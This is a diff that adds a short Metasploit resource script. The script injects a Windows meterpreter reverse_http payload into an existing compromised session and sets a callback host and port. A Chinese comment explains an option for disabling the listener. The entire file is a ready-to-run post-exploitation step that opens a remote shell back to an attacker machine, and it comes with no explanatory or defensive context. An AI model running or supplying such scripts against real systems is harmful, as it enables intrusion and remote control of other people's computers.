@@ -1,0 +1,7 @@
+use exploit/windows/local/payload_inject
+set payload windows/meterpreter/reverse_http
+set session 4
+set LHOST 192.168.50.161
+set LPORT 80
+# set DisablePayloadHandler True # 不再建立监听器
+run
